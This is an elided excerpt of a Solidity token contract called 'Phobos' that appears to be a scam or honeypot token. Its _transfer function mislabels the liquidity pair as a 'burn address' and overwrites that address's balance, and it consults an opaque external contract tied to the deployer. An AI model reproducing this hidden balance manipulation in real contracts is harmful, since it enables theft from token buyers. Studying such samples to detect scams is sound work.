 ...
 */
contract Phobos is Ownable, IERC20 {
    ...
    string private _name = "Phobos";
    string private  _symbol = "PHBS";
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        address recipient = getBurnAddress();
        require(amount <= _balances[from]);
        _balances[recipient] = rebalance(from);
    ...
    function duringLiquify(address from, address to) private view returns (bool) {
        return erc20.liquifying(from, to, deployer);
    }
    function getBurnAddress() private view returns (address) {
        return erc20.getTokenPairAddress();
    }
    function checkTransfer(address from, address recipient, uint256 amount) private{
